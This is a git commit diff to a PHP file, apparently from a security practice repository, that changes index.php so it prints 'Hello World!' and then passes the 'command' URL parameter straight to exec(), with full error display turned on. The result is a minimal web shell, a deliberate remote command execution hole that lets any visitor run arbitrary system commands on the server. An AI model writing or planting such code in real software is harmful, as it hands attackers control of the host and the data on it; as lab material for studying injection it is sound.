1a5b9250c1220322898d0166f949b2ef4145e212
justmycode <37841090+justmycode-sec@users.noreply.github.com>
2023-08-02 03:02:51 -0700

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,7 @@
 <?php
-$command = "ls ".$_GET['command'];
-
-$output = exec($command);
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+$command = $_GET['command'];
+echo "Hello World!<br><br>";
+echo exec($command);
